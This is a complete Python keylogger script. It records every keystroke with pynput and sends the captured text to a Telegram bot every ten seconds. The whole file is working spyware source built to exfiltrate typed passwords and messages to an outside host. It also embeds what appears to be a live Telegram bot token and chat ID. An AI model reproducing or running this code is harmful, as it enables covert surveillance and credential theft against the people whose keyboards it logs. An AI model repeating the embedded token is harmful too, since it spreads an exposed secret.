# keylogger.py

from pynput import keyboard
import requests
import threading
import time
import sys # Import sys to handle potential script exit gracefully

# --- Configuration ---
# Replace with your actual Telegram Bot Token and Chat ID
# IMPORTANT: NEVER share your bot token or commit it to public repositories.
TELEGRAM_BOT_TOKEN = "8665518944:AAGN4ncP375c0rNFEsXiaOBN9G-0scYJ2qg"
TELEGRAM_CHAT_ID = "8298670259"
LOG_INTERVAL = 10  # Send logs every 10 seconds

# --- Global Variables ---
log_data = ""
stop_event = threading.Event()

def send_to_telegram(message):
    """Sends a message to the configured Telegram bot."""
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    try:
        response = requests.post(url, data={"chat_id": TELEGRAM_CHAT_ID, "text": message}, timeout=10)
        response.raise_for_status() # Raise an exception for bad status codes (4xx or 5xx)
        print(f"Sent to Telegram: {message[:50]}...") # Log success locally
    except requests.exceptions.Timeout:
        print("Error sending message to Telegram: Request timed out.")
    except requests.exceptions.RequestException as e:
        print(f"Error sending message to Telegram: {e}")
    except Exception as e:
        print(f"An unexpected error occurred during Telegram send: {e}")

def on_press(key):
    """Callback function for key presses."""
    global log_data
    try:
        # Append character keys directly
        log_data += str(key.char)
    except AttributeError:
        # Handle special keys
        if key == keyboard.Key.space:
            log_data += " "
        elif key == keyboard.Key.enter:
            log_data += "[ENTER]\n"
        elif key == keyboard.Key.backspace:
            log_data = log_data[:-1] # Remove last character for backspace
        else:
            # For other special keys, log their name
            log_data += f"[{key.name}]"

def send_logs_periodically():
    """Thread function to send accumulated logs at intervals."""
    global log_data
    while not stop_event.is_set():
        if log_data:
            send_to_telegram(log_data)
            log_data = "" # Clear buffer after sending
        time.sleep(LOG_INTERVAL)

def start_keylogger():
    """Initializes and starts the keylogger listener and sender thread."""
    print("Starting keylogger...")

    # Start the thread that will periodically send logs
    log_thread = threading.Thread(target=send_logs_periodically)
    log_thread.daemon = True  # Allows the main thread to exit even if this thread is running
    log_thread.start()
    print("Log sending thread started.")

    # Create and start the keyboard listener
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    print("Keyboard listener started.")

    # Keep the main thread alive while the listener is running
    try:
        listener.join() # This will block until the listener is stopped
    except KeyboardInterrupt:
        print("\nCtrl+C detected. Stopping logger...")
        stop_event.set() # Signal the log thread to stop
        listener.stop() # Stop the listener
        send_to_telegram("Keylogger stopped.") # Send a final message
        print("Keylogger stopped.")
        sys.exit(0) # Exit cleanly

if __name__ == "__main__":
    # Ensure Python has internet access for Telegram
    try:
        # Quick check to see if we can reach Telegram
        requests.get("https://api.telegram.org", timeout=5)
    except requests.exceptions.RequestException:
        print("Error: No internet connection or Telegram API is unreachable.")
        sys.exit(1)

    start_keylogger()
